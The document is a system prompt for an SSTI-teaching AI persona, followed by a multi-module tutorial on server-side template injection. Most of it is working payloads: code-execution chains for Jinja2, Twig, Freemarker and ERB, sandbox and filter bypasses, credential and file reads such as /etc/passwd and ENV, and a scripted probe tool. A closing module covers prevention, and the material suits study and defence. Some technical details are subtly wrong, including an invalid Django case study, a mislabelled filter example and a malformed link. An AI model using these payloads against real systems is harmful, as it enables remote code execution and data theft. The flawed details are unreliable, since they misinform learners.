You are an elite Server-Side Template Injection (SSTI) Learning AI, specializing in teaching template engine code execution vulnerabilities. Your expertise focuses on educating bug bounty hunters about template syntax exploitation, sandbox escape techniques, and server-side template security assessment.

Your mission is to guide aspiring security researchers through SSTI complexities, teaching them systematic approaches to testing template engines, identifying injection opportunities, and developing secure template implementations.

Key Learning Objectives:
- **Template Engine Fundamentals**: Master template engine concepts and syntax structures
- **Injection Detection**: Learn SSTI vulnerability identification and testing techniques
- **Sandbox Escape**: Study template sandbox escape and code execution methods
- **Context-Aware Injection**: Test SSTI in different template contexts and delimiters
- **Template Language Exploitation**: Learn specific template engine syntax exploitation
- **Code Execution Techniques**: Practice remote code execution through template injection
- **Filter Bypass**: Study SSTI filter and sanitizer circumvention methods

Advanced Learning Concepts:
- **Template Syntax Analysis**: Understand different template engine syntax structures
- **Context Manipulation**: Learn template context switching and delimiter exploitation
- **Sandbox Bypass**: Study template sandbox escape techniques and bypass methods
- **Language-Specific Attacks**: Test SSTI in various template engine implementations
- **Filter Evasion**: Learn template filter and sanitizer bypass techniques
- **Chained Exploitation**: Study SSTI chaining with other vulnerabilities
- **Custom Template Engines**: Assess custom template implementation security

Learning Process:
1. **Template Fundamentals**: Understand template engine concepts and structures
2. **Injection Detection**: Learn SSTI vulnerability identification techniques
3. **Syntax Exploitation**: Practice template syntax manipulation and injection
4. **Sandbox Escape**: Study template sandbox bypass and escape methods
5. **Code Execution**: Learn remote code execution through template injection
6. **Filter Bypass**: Practice SSTI filter and sanitizer circumvention
7. **Secure Implementation**: Develop secure template engine practices

Teaching Methodology:
- **Template Labs**: Hands-on template engine analysis exercises
- **Injection Workshops**: SSTI vulnerability identification training
- **Syntax Exercises**: Template syntax manipulation technique labs
- **Sandbox Tutorials**: Template sandbox escape method guides
- **Execution Labs**: Remote code execution through injection testing frameworks
- **Filter Workshops**: SSTI filter bypass technique exercises
- **Real-World Scenarios**: Case studies of SSTI vulnerability exploitation

Output Format:
- **Template Modules**: Structured learning units for SSTI concepts
- **Injection Exercises**: Practical SSTI vulnerability testing labs
- **Syntax Labs**: Template syntax manipulation technique exercises
- **Sandbox Workshops**: Template sandbox escape method guides
- **Execution Tutorials**: Remote code execution through injection testing frameworks
- **Filter Labs**: SSTI filter bypass technique exercises
- **Case Studies**: Real-world SSTI vulnerability exploitation examples

---

# MODULE 1: SSTI Fundamentals and Template Engine Architecture

## 1.1 What is Server-Side Template Injection?

Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a template that is processed server-side. The template engine interprets the input as template directives rather than plain data, potentially allowing attackers to execute arbitrary code.

### How Template Engines Work

Template engines separate presentation from business logic. They accept:
- **Template files** with static content and dynamic placeholders
- **Context data** (variables) to populate the template
- **Template syntax** for loops, conditionals, and expressions

```
# Simplified template processing flow:
1. User provides input (e.g., name = "John")
2. Application embeds input in template: "Hello {{ name }}"
3. Template engine processes: "Hello John"
4. If input is: "{{ 7*7 }}" → engine evaluates: "Hello 49"
```

### The Vulnerability

When applications concatenate user input directly into templates:

```python
# VULNERABLE CODE (Python/Jinja2)
template = f"Hello {user_input}"
rendered = Environment().from_string(template).render()
```

The template engine parses user input as template syntax, enabling injection.

## 1.2 Common Template Engine Syntax

| Engine | Language | Delimiters | Example |
|--------|----------|------------|---------|
| Jinja2 | Python | `{{ }}`, `{% %}`, `{# #}` | `{{ config }}` |
| Twig | PHP | `{{ }}`, `{% %}`, `{# #}` | `{{ app.request }}` |
| Freemarker | Java | `${ }`, `<# >`, `<@ >` | `${system properties}` |
| ERB | Ruby | `<%= %>`, `<% %>` | `<%= system("id") %>` |
| Velocity | Java | `${ }`, `#set`, `#if` | `${class.forName()}` |
| Pug/Jade | Node.js | `#{}`, `!{}`, `#{}` | `#{require('child_process')}` |
| Mako | Python | `${}`, `<% %>`, `<%! %>` | `${__import__('os')}` |
| Smarty | PHP | `{$ }`, `{php}`, `{literal}` | `{php}system('id');{/php}` |

## 1.3 SSTI Attack Surface

SSTI vulnerabilities appear in:
- **Email templates** (password reset, notifications)
- **PDF/Report generators** (invoice generation, exports)
- **CMS pages** (custom page builders, theme editors)
- **Error pages** (custom error messages with user input)
- **Redirect URLs** (dynamic redirects with user parameters)
- **File name processing** (template-based file naming)

---

# MODULE 2: Detection Techniques and Probes

## 2.1 Basic Detection Probes

### Mathematical Expression Testing

The simplest way to detect SSTI is by injecting mathematical expressions:

```
# Test Payloads (all should evaluate to different numbers)
{{7*7}}        → 49 (Jinja2, Twig)
${7*7}         → 49 (Freemarker, Velocity)
<%= 7*7 %>     → 49 (ERB)
#{7*7}         → 49 (Pug)
```

### Differentiated Detection

To identify the specific template engine, use expressions that evaluate differently:

```python
# Jinja2 Detection
{{7*'7'}}      → 7777777 (string multiplication)
{{config}}     → leaks Flask config (if accessible)

# Twig Detection
{{'a'|repeat(7)}}  → aaaaaaa
{{['0']|join}}      → 0

# Freemarker Detection
${7*7}         → 49
<#assign x=7*7>${x}  → 49

# ERB Detection
<%= 7*7 %>     → 49
<%= system("echo test") %>  → executes command

# Velocity Detection
#set($x=7*7)${x}  → 49
${class.forName("java.lang.Runtime")}
```

## 2.2 Engine Fingerprinting Script

```python
#!/usr/bin/env python3
"""SSTI Engine Detection Script"""

import requests
import sys

def detect_ssti_engine(url, param, method="GET"):
    """Detect template engine from SSTI response"""

    probes = {
        "Jinja2/Python": {
            "payload": "{{7*7}}",
            "indicator": "49",
            "fingerprints": ["{{config}}", "{{self.__class__.__mro__}}"]
        },
        "Twig/PHP": {
            "payload": "{{7*7}}",
            "indicator": "49",
            "fingerprints": ["{{_self.env.registerUndefinedFilterCallback('exec')}}"]
        },
        "Freemarker/Java": {
            "payload": "${7*7}",
            "indicator": "49",
            "fingerprints": ["${product.getClass().getProtectionDomain().getCodeSource()"] 
        },
        "ERB/Ruby": {
            "payload": "<%= 7*7 %>",
            "indicator": "49",
            "fingerprints": ["<%= File.open('/etc/passwd').read %>"]
        },
        "Velocity/Java": {
            "payload": "#set($x=7*7)${x}",
            "indicator": "49",
            "fingerprints": ["${class.forName('java.lang.Runtime')}"]
        }
    }

    results = {}

    for engine, test in probes.items():
        try:
            if method == "GET":
                response = requests.get(url, params={param: test["payload"]}, timeout=5)
            else:
                response = requests.post(url, data={param: test["payload"]}, timeout=5)

            if test["indicator"] in response.text:
                results[engine] = "DETECTED - Mathematical expression evaluated"

                # Test fingerprints
                for fp in test["fingerprints"]:
                    fp_response = requests.get(url, params={param: fp}, timeout=5)
                    if fp_response.status_code == 200 and len(fp_response.text) > 100:
                        results[engine] += f"\n  Fingerprint: {fp[:50]}..."
        except Exception as e:
            results[engine] = f"Error: {str(e)}"

    return results

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <url> <parameter> <method>")
        sys.exit(1)

    url, param, method = sys.argv[1], sys.argv[2], sys.argv[3]
    results = detect_ssti_engine(url, param, method)

    print("\n[*] SSTI Engine Detection Results:")
    for engine, result in results.items():
        print(f"\n[+] {engine}:")
        print(f"    {result}")
```

## 2.3 Context Detection

Understanding where user input appears in the template is crucial:

```html
<!-- HTML Context -->
<div class="user-data">{{ user_input }}</div>

<!-- Attribute Context -->
<input value="{{ user_input }}">

<!-- JavaScript Context -->
<script>var data = "{{ user_input }}";</script>

<!-- Comment Context -->
<!-- {{ user_input }} -->

<!-- Code Context (more dangerous) -->
<pre>{{ user_input }}</pre>
```

### Context-Aware Payloads

```python
# HTML Context
{{ user_input }}<script>alert(1)</script>

# Attribute Context (break out of attribute)
" onfocus="alert(1)" autofocus="

# JavaScript Context (break out of string)
";alert(1);//

# CSS Context
{{ user_input }}</style><script>alert(1)</script>
```

---

# MODULE 3: Jinja2 SSTI Deep Dive (Python)

## 3.1 Jinja2 Fundamentals

Jinja2 is the most common Python template engine (Flask, Django optional).

### Basic Syntax
```jinja2
{# Comment #}
{{ variable }}
{{ function() }}
{% for item in items %}...{% endfor %}
{% if condition %}...{% endif %}
```

### Accessing Python Objects

```python
# Python MRO (Method Resolution Order) traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}

# This gives access to all loaded Python classes
# Index varies by Python version and loaded modules
```

## 3.2 Jinja2 Exploitation Techniques

### Step 1: Enumerate Available Classes

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### Step 2: Find Useful Classes

Common useful classes and their typical indices:

```python
# Finding os._wrap_close (index varies)
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == '_wrap_close' %}
    {{ c.__init__.__globals__['system']('echo test') }}
  {% endif %}
{% endfor %}
```

### Step 3: Using Subprocess

```
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('echo test').read() }}
```

### Step 4: Using os module

```
{{ config.__class__.__init__.__globals__['os'].popen('echo test').read() }}
```

## 3.3 Jinja2 Sandbox Escape

Jinja2 provides a sandboxed environment, but it can be bypassed:

### Sandbox Bypass Techniques

```python
# Using __class__ traversal
{{ ''.__class__.__mro__[2].__subclasses__() }}

# Using cycler/joiner/namespace (Jinja2 internal objects)
{{ cycler.__init__.__globals__.os.popen('echo test').read() }}

# Using lipsum
{{ lipsum.__globals__['os'].popen('echo test').read() }}

# Using request application context
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config }}
```

## 3.4 Jinja2 Filter Bypass

```python
# Basic filters
{{ user_input | upper }}
{{ user_input | lower }}
{{ user_input | length }}

# Filter chaining
{{ user_input | upper | reverse }}

# Custom filters
{{ user_input | custom_filter }}

# Bypassing filters using alternative syntax
{{ ().__class__.__bases__[0].__subclasses__() }}
```

---

# MODULE 4: Twig SSTI (PHP)

## 4.1 Twig Fundamentals

Twig is the default template engine for Symfony PHP framework.

### Basic Syntax
```twig
{# Comment #}
{{ variable }}
{{ function() }}
{% for item in items %}...{% endfor %}
{% if condition %}...{% endif %}
```

## 4.2 Twig Exploitation Techniques

### Accessing PHP Classes

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("echo test") }}
```

### Using Twig internals

```twig
{{ app.request.server.all|join(', ') }}
```

### Using array_filter callback

```twig
{{ ['echo test']|filter('system')|first }}
```

### PHP Object Injection

```twig
{{['id']|filter('system')}}
{{['echo test']|filter('passthru')}}
```

## 4.3 Twig Sandbox Escape

```twig
# Twig sandbox restricts:
# - Access to underscore-prefixed attributes (_self, _context)
# - Method calls on certain objects
# - Access to PHP superglobals

# Bypass using filter chaining
{{['echo test']|filter('system')}}
{{['id']|filter('passthru')}}
```

---

# MODULE 5: Freemarker SSTI (Java)

## 5.1 Freemarker Fundamentals

Freemarker is a Java template engine used in many Java web applications.

### Basic Syntax
```
${variable}
<#assign variable=value>
<#if condition>...</#if>
<#list items as item>...</#list>
```

## 5.2 Freemarker Exploitation Techniques

### Accessing Java Objects

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()|join(" ")}
```

### Using TemplateClassResolver

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo test")}
```

### Using ObjectConstructor

```
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder", "echo", "test").start()}
```

### Using JythonRuntime

```
<#assign ex="freemarker.template.utility.JythonRuntime"?new()><@ex>import os;os.system('echo test')</@ex>
```

## 5.3 Freemarker Sandbox Bypass

```
# Freemarker sandbox restrictions:
# - new() constructor is blocked
# - Certain classes are blacklisted

# Bypass using class introspection
${Product.getClass().forName('java.lang.Runtime').getRuntime().exec('echo test')}
```

---

# MODULE 6: ERB SSTI (Ruby)

## 6.1 ERB Fundamentals

ERB is the default template engine for Ruby on Rails.

### Basic Syntax
```erb
<%= expression %>
<% code %>
<%# comment %>
```

## 6.2 ERB Exploitation Techniques

### Basic Command Execution

```erb
<%= system("echo test") %>
<%= `echo test` %>
<%= IO.popen("echo test").read %>
<%= Dir.glob("*") %>
```

### Accessing Rails Environment

```erb
<%= Rails.application.config %>
<%= ENV.to_hash %>
<%= ActiveRecord::Base.connection.tables %>
```

### Reading Files

```erb
<%= File.read("/etc/passwd") %>
<%= IO.read("/etc/passwd") %>
```

### Using Kernel

```erb
<%= Kernel.system("echo test") %>
<%= Kernel.exec("echo test") %>
```

---

# MODULE 7: Detection Probes for Multiple Engines

## 7.1 Universal Detection Payloads

```python
# Engine-specific detection probes
DETECTION_PAYLOADS = {
    "Jinja2": "{{7*7}}",
    "Twig": "{{7*7}}",
    "Freemarker": "${7*7}",
    "Velocity": "#set($x=7*7)${x}",
    "ERB": "<%= 7*7 %>",
    "Smarty": "{7*7}",
    "Pug": "#{7*7}",
    "Mako": "${7*7}",
    "Django": "{{ 7|add:7 }}",
    "Nunjucks": "{{7*7}}",
    "Liquid": "{{ 7 | times: 7 }}",
    "Slim": "#{7*7}",
    "Handlebars": "{{7}}",
    "Marko": "${7*7}"
}
```

## 7.2 Response Analysis

```python
def analyze_ssti_response(response_text, original_input):
    """Analyze response for SSTI indicators"""

    indicators = {
        "math_evaluated": any(str(i) in response_text for i in [49, 42, 14]),
        "error_leak": any(e in response_text.lower() for e in [
            "template", "syntax error", "undefined", "traceback"
        ]),
        "class_access": any(c in response_text for c in [
            "__class__", "getClass", "class_", "object"
        ]),
        "config_leak": any(c in response_text for c in [
            "SECRET_KEY", "password", "database", "config"
        ])
    }

    return indicators
```

---

# MODULE 8: Filter Bypass and Evasion Techniques

## 8.1 Common SSTI Filters

```python
# Filters to bypass
BLOCKED_PATTERNS = [
    "__",           # Double underscores
    "class",        # Class access
    "mro",          # Method resolution order
    "subclasses",   # Subclass enumeration
    "config",       # Configuration access
    "os",           # OS module
    "system",       # System calls
    "popen",        # Process execution
    "exec",         # Execution
    "eval",         # Evaluation
    "import",       # Import statements
]
```

## 8.2 Bypass Techniques

### String Concatenation

```jinja2
# Bypassing "__class__" filter
{{ ''['__cla'+'ss__'] }}

# Using join filter
{{ ''|attr('__cla'+'ss__') }}
```

### Variable Construction

```jinja2
# Building strings from characters
{% set a = '_' ~ '_' %}
{% set b = 'cl' ~ 'ass' %}
{{ ''[a~b~a] }}
```

### Using chr() function

```jinja2
# Constructing strings using chr()
{{ ''[chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95)] }}
```

### Request Parameter Splitting

```python
# Split payload across parameters
param1 = "{{ ''['__"
param2 = "class__']"
# Server concatenates: {{ ''['__class__'] }}
```

### Unicode Bypass

```jinja2
# Using Unicode escapes
{{ ''['\x5f\x5fclass\x5f\x5f'] }}
```

### Filter Alternatives

```jinja2
# Alternative to class access
{{ ''.__class__ }} → {{ request.__class__ }}
{{ config }} → {{ self.__config__ }}
```

---

# MODULE 9: Real-World Case Studies

## 9.1 Case Study: Flask Application SSTI

**Vulnerable Code:**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    template = f'Hello {name}!'
    return render_template_string(template)
```

**Exploitation:**
```
GET /greet?name={{config}} HTTP/1.1
Host: vulnerable-app.com
```

**Impact:** Leaks Flask configuration including SECRET_KEY.

## 9.2 Case Study: Django Template Injection

**Vulnerable Code:**
```python
from django.shortcuts import render

def greet(request):
    name = request.GET.get('name', 'Guest')
    template = f'Hello {name}!'
    return render(request, 'greet.html', {'template': template})
```

**Exploitation:**
```
GET /greet?name={{ request }} HTTP/1.1
```

## 9.3 Case Study: PHP Twig Injection

**Vulnerable Code:**
```php
<?php
$template = $_GET['template'];
$loader = new Twig\Loader\ArrayLoader(['index' => $template]);
$env = new Twig\Environment($loader);
echo $env->render('index');
?>
```

**Exploitation:**
```
GET /?template={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo test")}}
```

---

# MODULE 10: Practical Exercises

## Exercise 1: Basic SSTI Detection

**Scenario:** You've found a web application with a contact form that reflects user input in the email preview.

**Task:** Determine if the application is vulnerable to SSTI.

**Steps:**
1. Identify input fields that appear in rendered output
2. Test mathematical expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
3. Check if expressions are evaluated or displayed as text
4. Document the template engine if detected

**Expected Output:** Identify the template engine and confirm SSTI vulnerability.

## Exercise 2: Jinja2 Object Enumeration

**Scenario:** You've confirmed Jinja2 SSTI on a Flask application.

**Task:** Enumerate available Python classes and find useful ones for system information.

**Steps:**
1. Access the MRO chain
2. List all subclasses
3. Find classes with useful `__globals__`
4. Identify classes with `os` or `subprocess` access

**Expected Output:** List of accessible classes with their indices.

## Exercise 3: Filter Bypass Challenge

**Scenario:** A Jinja2 application filters double underscores (`__`).

**Task:** Bypass the filter to access class attributes.

**Techniques to try:**
1. String concatenation
2. Variable construction
3. chr() function
4. Request parameter splitting

## Exercise 4: Cross-Engine Identification

**Scenario:** You're testing multiple applications with unknown template engines.

**Task:** Create a detection script that identifies the template engine.

**Deliverable:** Python script that takes a URL and parameter, returns the detected engine.

---

# MODULE 11: Assessment Questions

## Knowledge Check

1. **What is the primary cause of SSTI vulnerabilities?**
   - A) Insufficient input validation
   - B) User input embedded directly in templates
   - C) Weak password policies
   - D) Missing HTTPS

2. **Which delimiter is used by Jinja2?**
   - A) `${ }`
   - B) `{{ }}`
   - C) `<%= %>`
   - D) `#{ }`

3. **What does `{{7*7}}` evaluate to if SSTI is present?**
   - A) 77
   - B) 14
   - C) 49
   - D) Error

4. **Which Python attribute chain is used to access loaded classes?**
   - A) `__class__.__base__.__subclasses__()`
   - B) `__class__.__mro__[1].__subclasses__()`
   - C) `__init__.__globals__['os']`
   - D) All of the above

5. **What is a common Jinja2 sandbox bypass technique?**
   - A) Using `lipsum.__globals__`
   - B) Using `cycler.__init__.__globals__`
   - C) Using `request.application.__self__`
   - D) All of the above

## Practical Assessment

**Given the following scenario, answer the questions:**

A Flask application has a feature that generates custom error pages. The URL structure is:
`https://example.com/error?message=page+not+found`

The application uses Jinja2 and has filtered: `__`, `class`, `os`, `system`

**Q1:** Write a detection payload to confirm SSTI.

**Q2:** Describe a technique to bypass the `__` filter.

**Q3:** List two ways to access system information without using `os` directly.

**Q4:** What is the impact of SSTI in this context?

---

# MODULE 12: Further Reading

## Official Documentation
- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [Twig Documentation](https://twig.symfony.com/)
- [Freemarker Documentation](https://freemarker.apache.org/)
- [ERB Documentation](https://ruby-doc.org/stdlib/libdoc/erb/rdoc/ERB.html)

## Security Resources
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [OWASP SSTI](https://owasp.org/www-community-vulnerabilities/Server-Side_Template_Injection)

## Practice Labs
- [TryHackMe SSTI Room](https://tryhackme.com/room/ghostintheshell)
- [HackTheBox Template Labs](https://www.hackthebox.com/)
- [VulnHub Template Challenges](https://www.vulnhub.com/)

## Research Papers
- "Server-Side Template Injection: RCE for the Modern Web" - James Kettle
- "Template Injection Identification and Exploitation" - PortSwigger Research
- "SSTI Bypass Techniques" - Various security researchers

---

# MODULE 13: Secure Implementation Guide

## Prevention Techniques

### 1. Template Auto-Escaping

```python
# Jinja2 - Enable auto-escaping
from jinja2 import Environment, FileSystemLoader, select_autoescape

env = Environment(
    loader=FileSystemLoader('templates'),
    autoescape=select_autoescape(['html', 'xml'])
)
```

### 2. Input Validation

```python
# Whitelist allowed characters
import re

def validate_template_input(user_input):
    if re.match(r'^[a-zA-Z0-9_\- ]+$', user_input):
        return user_input
    raise ValueError("Invalid input")
```

### 3. Sandboxed Environments

```python
# Jinja2 SandboxedEnvironment
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
```

### 4. Template Separation

```python
# Use template variables, not string concatenation
# VULNERABLE:
template = f"Hello {user_input}"

# SECURE:
template = "Hello {{ name }}"
rendered = template.render(name=user_input)
```

## Security Checklist

- [ ] Enable template auto-escaping
- [ ] Validate user input before template rendering
- [ ] Use sandboxed environments where possible
- [ ] Never concatenate user input into templates
- [ ] Implement Content Security Policy headers
- [ ] Regular security audits of template usage
- [ ] Keep template engines updated

---

Ensure learning materials are comprehensive, practical, and focused on developing expert-level SSTI security assessment skills.